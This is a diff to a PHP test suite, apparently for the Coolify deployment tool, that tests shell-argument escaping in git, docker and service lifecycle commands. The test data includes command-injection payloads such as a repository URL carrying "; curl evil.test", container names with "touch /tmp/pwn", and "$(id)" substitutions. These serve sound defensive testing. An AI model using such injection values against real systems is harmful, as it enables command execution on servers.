@@ -1,10 +1,29 @@
 <?php
 
+use App\Actions\Service\DeployServiceApplication;
+use App\Actions\Service\StartService;
 use App\Jobs\ApplicationDeploymentJob;
 use App\Models\Application;
+use App\Models\ApplicationDeploymentQueue;
 use App\Models\ApplicationSetting;
+use App\Models\Environment;
+use App\Models\InstanceSettings;
+use App\Models\PrivateKey;
+use App\Models\Project;
+use App\Models\Server;
+use App\Models\ServerSetting;
+use App\Models\Service;
+use App\Models\StandaloneDocker;
+use App\Models\Team;
 use App\Rules\ValidGitBranch;
+use App\Support\RemoteProcessCommand;
 use App\Support\ValidationPatterns;
+use Illuminate\Foundation\Testing\LazilyRefreshDatabase;
+use Illuminate\Support\Collection;
+use Illuminate\Support\Facades\Bus;
+use Illuminate\Support\Facades\Process;
+
+uses(LazilyRefreshDatabase::class);
 
 describe('deployment job path field validation', function () {
     test('rejects shell metacharacters in dockerfile_location', function () {
@@ -288,7 +307,9 @@ describe('deployment git command escaping', function () {
         $instance = $job->newInstanceWithoutConstructor();
 
         foreach ([
+            'application' => new Application,
             'customPort' => 22,
+            'deployment_uuid' => 'deploy-uuid',
             'fullRepoUrl' => "git@example.com:org/repo.git'; curl evil.test; #",
         ] as $property => $value) {
             $reflectionProperty = $job->getProperty($property);
@@ -302,7 +323,7 @@ describe('deployment git command escaping', function () {
         $command = $method->invoke($instance, 'refs/heads/main`id`', '/root/.ssh/id_rsa');
 
         expect($command)
-            ->toContain("git ls-remote 'git@example.com:org/repo.git'\\''; curl evil.test; #' 'refs/heads/main`id`'")
+            ->toContain("git ls-remote -- 'git@example.com:org/repo.git'\\''; curl evil.test; #' 'refs/heads/main`id`'")
             ->toContain('-i /root/.ssh/id_rsa')
             ->not->toContain('repo.git; curl');
     });
@@ -379,25 +400,6 @@ describe('deployment git command escaping', function () {
             ->toContain("COOLIFY_URL='https://app.example.com/path' ")
             ->toContain("COOLIFY_FQDN='app.example.com' ")
             ->toContain("COOLIFY_RESOURCE_UUID='app-uuid' ");
-    });
-});
-
-describe('sharedDataApplications rules survive array_merge in controller', function () {
-    test('docker_compose_location safe regex is not overridden by local rules', function () {
-        $sharedRules = sharedDataApplications();
-
-        // Simulate what ApplicationsController does: array_merge(shared, local)
-        // After our fix, local no longer contains docker_compose_location,
-        // so the shared regex rule must survive
-        $localRules = [
-            'name' => 'string|max:255',
-            'docker_compose_domains' => 'array|nullable',
-        ];
-        $merged = array_merge($sharedRules, $localRules);
-
-        // The merged rules for docker_compose_location should be the safe regex, not just 'string'
-        expect($merged['docker_compose_location'])->toBeArray();
-        expect($merged['docker_compose_location'])->toContain('regex:'.ValidationPatterns::FILE_PATH_PATTERN);
     });
 });
 
@@ -877,54 +879,6 @@ describe('container name validation', function () {
     });
 });
 
-describe('dockerfile_target_build rules survive array_merge in controller', function () {
-    test('dockerfile_target_build safe regex is not overridden by local rules', function () {
-        $sharedRules = sharedDataApplications();
-
-        // Simulate what ApplicationsController does: array_merge(shared, local)
-        $localRules = [
-            'name' => 'string|max:255',
-            'docker_compose_domains' => 'array|nullable',
-        ];
-        $merged = array_merge($sharedRules, $localRules);
-
-        expect($merged)->toHaveKey('dockerfile_target_build');
-        expect($merged['dockerfile_target_build'])->toBeArray();
-        expect($merged['dockerfile_target_build'])->toContain('regex:'.ValidationPatterns::DOCKER_TARGET_PATTERN);
-    });
-});
-
-describe('docker_compose_custom_command rules survive array_merge in controller', function () {
-    test('docker_compose_custom_start_command safe regex is not overridden by local rules', function () {
-        $sharedRules = sharedDataApplications();
-
-        // Simulate what ApplicationsController does: array_merge(shared, local)
-        // After our fix, local no longer contains docker_compose_custom_start_command,
-        // so the shared regex rule must survive
-        $localRules = [
-            'name' => 'string|max:255',
-            'docker_compose_domains' => 'array|nullable',
-        ];
-        $merged = array_merge($sharedRules, $localRules);
-
-        expect($merged['docker_compose_custom_start_command'])->toBeArray();
-        expect($merged['docker_compose_custom_start_command'])->toContain('regex:'.ValidationPatterns::SHELL_SAFE_COMMAND_PATTERN);
-    });
-
-    test('docker_compose_custom_build_command safe regex is not overridden by local rules', function () {
-        $sharedRules = sharedDataApplications();
-
-        $localRules = [
-            'name' => 'string|max:255',
-            'docker_compose_domains' => 'array|nullable',
-        ];
-        $merged = array_merge($sharedRules, $localRules);
-
-        expect($merged['docker_compose_custom_build_command'])->toBeArray();
-        expect($merged['docker_compose_custom_build_command'])->toContain('regex:'.ValidationPatterns::SHELL_SAFE_COMMAND_PATTERN);
-    });
-});
-
 describe('API route middleware for deploy actions', function () {
     test('application start route requires deploy ability', function () {
         $routes = app('router')->getRoutes();
@@ -999,38 +953,105 @@ describe('API route middleware for deploy actions', function () {
 
 describe('service application lifecycle command escaping', function () {
     test('service application deploy action escapes docker command arguments', function () {
-        $source = file_get_contents(app_path('Actions/Service/DeployServiceApplication.php'));
+        Server::flushIdentityMap();
+        Bus::fake();
+        Process::fake();
+        InstanceSettings::forceCreate(['id' => 0]);
+        config(['app.maintenance.store' => 'array', 'constants.ssh.mux_enabled' => false]);
+        $team = Team::factory()->create();
+        $server = Server::factory()->create([
+            'team_id' => $team->id,
+            'private_key_id' => PrivateKey::factory()->create(['team_id' => $team->id])->id,
+        ]);
+        $destination = StandaloneDocker::query()->where('server_id', $server->id)->firstOrFail();
+        $project = Project::factory()->create(['team_id' => $team->id]);
+        $service = Service::factory()->create([
+            'environment_id' => Environment::factory()->create(['project_id' => $project->id])->id,
+            'server_id' => $server->id,
+            'destination_id' => $destination->id,
+            'destination_type' => $destination->getMorphClass(),
+            'docker_compose_raw' => "services:\n  app:\n    image: busybox:latest\n",
+        ]);
+        $service->parse();
+        $serviceApplication = $service->applications()->firstOrFail();
+        $payload = "app'; touch /tmp/pwn; '";
+        $serviceApplication->name = $payload;
 
-        expect($source)->toContain('escapeshellarg($workdir)')
-            ->and($source)->toContain('escapeshellarg($composeFile)')
-            ->and($source)->toContain('escapeshellarg($service->uuid)')
-            ->and($source)->toContain('escapeshellarg($composeServiceName)')
-            ->and($source)->toContain('escapeshellarg($service->destination->network)');
+        $script = RemoteProcessCommand::read(DeployServiceApplication::run($serviceApplication, pullLatestImages: true));
+
+        $compose = '--project-directory '.escapeshellarg($service->workdir()).' -f '.escapeshellarg($service->workdir().'/docker-compose.yml').' --project-name '.escapeshellarg($service->uuid);
+        expect($script)
+            ->toContain("docker compose {$compose} pull ".escapeshellarg($payload).' < /dev/null')
+            ->toContain("docker compose {$compose} up -d --no-deps ".escapeshellarg($payload).' < /dev/null')
+            ->not->toContain("pull {$payload}")
+            ->not->toContain("--no-deps {$payload}");
     });
 
-    test('service application restart and stop actions escape container names', function (string $path) {
-        $source = file_get_contents(app_path($path));
+    test('predefined network connect command escapes the container name', function () {
+        $service = (new Service)->forceFill(['uuid' => 'svc-uuid']);
+        $service->setRelation('destination', (new StandaloneDocker)->forceFill(['network' => 'coolify']));
 
-        expect($source)->toContain('escapeshellarg($serviceApplication->name');
+        expect(StartService::predefinedNetworkConnectCommand($service, 'app$(id)', []))
+            ->toContain(" 'app$(id)-svc-uuid' | grep -qxF 'coolify' || docker network connect --alias 'app$(id)-svc-uuid' 'coolify' 'app$(id)-svc-uuid' || echo 'Warning: Could not connect app$(id) to the coolify network.'");
+    });
+
+    test('docker status helper escapes container names', function (bool $isSwarm, string $expected) {
+        $server = (new Server)->forceFill(['id' => 1]);
+        $server->setRelation('settings', (new ServerSetting)->forceFill(['is_swarm_manager' => $isSwarm, 'is_swarm_worker' => false]));
+
+        expect(buildContainerStatusCommand($server, 'app$(id)'))->toBe($expected);
     })->with([
-        'restart action' => 'Actions/Service/RestartServiceApplication.php',
-        'stop action' => 'Actions/Service/StopServiceApplication.php',
+        'docker' => [false, "docker inspect --format '{{json .}}' 'app\$(id)'"],
+        'swarm' => [true, "docker service ls --filter 'name=app\$(id)' --format '{{json .}}' "],
     ]);
 
-    test('docker status helper escapes container names', function () {
-        $source = file_get_contents(base_path('bootstrap/helpers/docker.php'));
+    test('application deployment shell commands escape the generated container name', function () {
+        $containerName = "app'; touch /tmp/pwn; '";
+        $escapedContainerName = escapeshellarg($containerName);
+        $commands = collect();
+        $job = new class($commands) extends ApplicationDeploymentJob
+        {
+            public function __construct(public Collection $capturedCommands) {}
 
-        expect($source)->toContain('function buildContainerStatusCommand')
-            ->and($source)->toContain('escapeshellarg("name={$container_id}")')
-            ->and($source)->toContain('escapeshellarg($container_id)');
-    });
+            public function execute_remote_command(...$commands)
+            {
+                foreach ($commands as $command) {
+                    $this->capturedCommands->push(data_get($command, 'command') ?? $command[0]);
+                }
+            }
+        };
+        $application = (new Application)->forceFill([
+            'health_check_enabled' => true,
+            'health_check_start_period' => 0,
+            'health_check_retries' => 1,
+            'health_check_interval' => 0,
+        ]);
+        $application->setRelation('settings', (new ApplicationSetting)->forceFill(['stop_grace_period' => 10]));
+        $server = (new Server)->forceFill(['id' => 1]);
+        $server->setRelation('settings', (new ServerSetting)->forceFill(['is_swarm_manager' => false, 'is_swarm_worker' => false]));
+        $queue = Mockery::mock(ApplicationDeploymentQueue::class)->makePartial();
+        $queue->shouldReceive('addLogEntry');
+        foreach ([
+            'application' => $application,
+            'application_deployment_queue' => $queue,
+            'server' => $server,
+            'container_name' => $containerName,
+            'deployment_uuid' => 'deploy-uuid',
+            'saved_outputs' => collect(),
+        ] as $property => $value) {
+            (new ReflectionProperty(ApplicationDeploymentJob::class, $property))->setValue($job, $value);
+        }
 
-    test('service application logs endpoint passes raw container name to docker helpers', function () {
-        $source = file_get_contents(app_path('Http/Controllers/Api/ServiceApplicationsController.php'));
+        (new ReflectionMethod(ApplicationDeploymentJob::class, 'health_check'))->invoke($job);
+        (new ReflectionMethod(ApplicationDeploymentJob::class, 'query_logs'))->invoke($job);
+        (new ReflectionMethod(ApplicationDeploymentJob::class, 'graceful_shutdown_container'))->invoke($job, $containerName);
 
-        expect($source)->toContain('getContainerStatus($server, $containerName)')
-            ->and($source)->toContain('getContainerLogs($server, $containerName, $lines)')
-            ->and($source)->not->toContain('$safeContainerName = escapeshellarg($containerName)');
+        expect($commands->all())
+            ->toContain("docker inspect --format='{{json .State.Health.Status}}' {$escapedContainerName}")
+            ->toContain("docker inspect --format='{{json .State.Health.Log}}' {$escapedContainerName}")
+            ->toContain("docker logs -n 100 {$escapedContainerName}")
+            ->toContain(dockerStopCommand(10, $escapedContainerName, $server))
+            ->and($commands->implode("\n"))->not->toContain(" {$containerName}");
     });
 });
 
@@ -1173,47 +1194,6 @@ describe('install/build/start command validation', function () {
 
         expect($validator->fails())->toBeFalse();
     })->with(['install_command', 'build_command', 'start_command']);
-});
-
-describe('install/build/start command rules survive array_merge in controller', function () {
-    test('install_command safe regex is not overridden by local rules', function () {
-        $sharedRules = sharedDataApplications();
-
-        $localRules = [
-            'name' => 'string|max:255',
-            'docker_compose_domains' => 'array|nullable',
-        ];
-        $merged = array_merge($sharedRules, $localRules);
-
-        expect($merged['install_command'])->toBeArray();
-        expect($merged['install_command'])->toContain('regex:'.ValidationPatterns::SHELL_SAFE_COMMAND_PATTERN);
-    });
-
-    test('build_command safe regex is not overridden by local rules', function () {
-        $sharedRules = sharedDataApplications();
-
-        $localRules = [
-            'name' => 'string|max:255',
-            'docker_compose_domains' => 'array|nullable',
-        ];
-        $merged = array_merge($sharedRules, $localRules);
-
-        expect($merged['build_command'])->toBeArray();
-        expect($merged['build_command'])->toContain('regex:'.ValidationPatterns::SHELL_SAFE_COMMAND_PATTERN);
-    });
-
-    test('start_command safe regex is not overridden by local rules', function () {
-        $sharedRules = sharedDataApplications();
-
-        $localRules = [
-            'name' => 'string|max:255',
-            'docker_compose_domains' => 'array|nullable',
-        ];
-        $merged = array_merge($sharedRules, $localRules);
-
-        expect($merged['start_command'])->toBeArray();
-        expect($merged['start_command'])->toContain('regex:'.ValidationPatterns::SHELL_SAFE_COMMAND_PATTERN);
-    });
 });
 
 describe('git_branch validation rules survive array_merge in controller', function () {
